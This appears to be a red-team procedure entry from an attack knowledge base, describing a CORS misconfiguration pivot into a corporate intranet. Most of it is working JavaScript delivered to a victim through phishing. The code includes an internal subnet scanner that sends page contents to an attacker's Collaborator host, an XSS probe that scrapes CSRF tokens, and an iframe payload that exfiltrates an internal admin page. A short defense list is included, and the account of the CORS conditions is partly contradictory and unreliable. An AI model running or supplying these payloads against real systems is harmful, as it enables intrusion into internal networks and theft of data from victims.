---
id: 874d0849-ba12-40ed-8582-5e2606858b12
name: CORS Misconfiguration Leading To Internal Network Pivot
type: procedure
verified: true
submitted: true
created_at: '2020-08-17T07:52:51.693306+00:00'
updated_at: '2023-05-26T01:01:10.817964+00:00'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - '[[tags/CORS]]'
  - '[[tags/Internal Network Pivot]]'
  - '[[tags/Web Applications]]'
commands: []
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# CORS Misconfiguration Leading To Internal Network Pivot

## Summary

This procedure exploits a CORS misconfiguration where the Access-Control-Allow-Credentials header is not set, allowing an attacker's domain to receive the victim's cookies. It demonstrates pivoting from an external attack surface to internal network discovery, identifying XSS vulnerabilities, and exfiltrating sensitive internal page source code, such as admin panels, to enable further exploitation like user deletion.

## Description

In scenarios where a web application fails to properly configure CORS headers, particularly omitting Access-Control-Allow-Credentials: true alongside Access-Control-Allow-Origin, an attacker can craft malicious JavaScript that runs in the victim's browser context. This script can perform internal network scans, probe for vulnerabilities like XSS in internal endpoints, and exfiltrate data back to the attacker's controlled server (e.g., Burp Collaborator). The technique is useful in red team engagements targeting corporate intranets accessible only from internal networks, such as employee portals or admin interfaces. Prerequisites include social engineering to deliver the exploit to a victim with internal network access. Expected outcomes include discovery of internal IPs/ports, confirmation of XSS, and retrieval of admin page source code revealing backend functionalities.

## Requirements

1. Access to Burp Suite with Collaborator enabled for out-of-band interactions.
2. Victim browser access to the attacker's malicious page (delivered via phishing or similar).
3. Knowledge of the target's internal network range (e.g., 192.168.0.0/24).
4. Assumed CORS misconfiguration on the target application allowing credentialed requests.

## Defense

Defensive measures and detection strategies:

- Enforce strict CORS policies: Set Access-Control-Allow-Origin to specific domains and require Access-Control-Allow-Credentials: true only for trusted origins.
- Implement Content Security Policy (CSP) to restrict script execution and frame loading.
- Monitor for anomalous internal network requests from browsers (e.g., fetch to private IPs) using web application firewalls (WAF) or endpoint detection tools.
- Enable browser logging for CORS errors and JavaScript execution; scan for Collaborator-like domains in outbound traffic.

## Objectives

1. Discover internal network endpoints accessible from the victim's browser.
2. Identify and confirm XSS vulnerabilities in internal applications.
3. Exfiltrate source code from protected internal pages to uncover administrative functions.
4. Enable further pivots, such as account manipulation based on revealed UI elements.

## Instructions

### Step 1: Prepare Burp Collaborator

**Context**: Initialize Burp Collaborator to receive out-of-band callbacks from the victim's browser during the exploit execution.

Launch Burp Suite and navigate to the Collaborator tab. Start a new Collaborator server instance if needed, then click "Copy to Clipboard" to obtain the unique Collaborator URL (e.g., abc123.oastify.com). This URL will be used as the exfiltration endpoint in the scripts.

### Step 2: Deliver Local Network Scanner

**Context**: Craft and deliver a JavaScript exploit to the victim that scans the internal network for active endpoints, leveraging the CORS misconfiguration to send responses back to the attacker.

Host the malicious HTML page containing the script on an attacker-controlled domain. Use social engineering (e.g., phishing email) to lure the victim into visiting the page while authenticated to the target application. Replace placeholders in the script with the Collaborator URL and assumed internal subnet (e.g., 192.168.0.1-255:8080).

**Code** ([[codes/JavaScript-Local-Network-Scanner-For-CORS-Pivot]]):

```html
<script>
var q = [], collaboratorURL = 'http://$collaboratorPayload';
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(wait){
    fetchUrl(url,wait);
    }
  }('http://192.168.0.'+i+':8080'));
}
for(i=1;i<=20;i++){
  if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait){
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
  }
  ))
  .catch(e => {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
</script>
```

### Step 3: Monitor Network Scan Results

**Context**: Observe callbacks in Burp Collaborator to identify active internal IPs and ports probed by the victim's browser.

In Burp Suite's Collaborator client, wait for HTTP interactions. If no immediate responses appear, click "Poll Now" to refresh. Analyze the incoming requests for details like source IP (internal host), port (e.g., 8080), and any response code or body snippets, indicating reachable endpoints.

**Expected Output**: HTTP GET requests to the Collaborator URL with query parameters like ?ip=192.168.0.50:8080&code=... showing successful fetches from internal servers.

### Step 4: Probe for XSS Vulnerability

**Context**: Use the discovered internal IP to test for reflected XSS in the login form, confirming injectability via callback.

Update the XSS probe script with the identified IP from Step 3 and the Collaborator URL. Deliver this updated exploit to the victim similarly to Step 2.

**Code** ([[codes/JavaScript-XSS-Probe-For-Login-Form]]):

```html
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
```

**Expected Output**: Callback in Collaborator with ?foundXSS=1 confirming the XSS payload executed and triggered an image load.

### Step 5: Exfiltrate Admin Page Source

**Context**: Leverage the confirmed XSS to load and exfiltrate the source code of an internal admin page, revealing sensitive functionalities.

Modify the exfiltration script with the target IP and Collaborator URL. Deliver to the victim to inject the iframe-based payload via the XSS vector.

**Code** ([[codes/JavaScript-Admin-Page-Source-Exfiltration]]):

```html
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">' );
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
```

### Step 6: Analyze Exfiltrated Source

**Context**: Review the admin page source in Collaborator to identify exploitable features, such as user deletion options.

Poll the Collaborator for the latest interaction containing the encoded innerHTML of the admin page. Decode the ?code= parameter to view the full source, noting elements like delete user buttons or forms that could lead to further attacks.
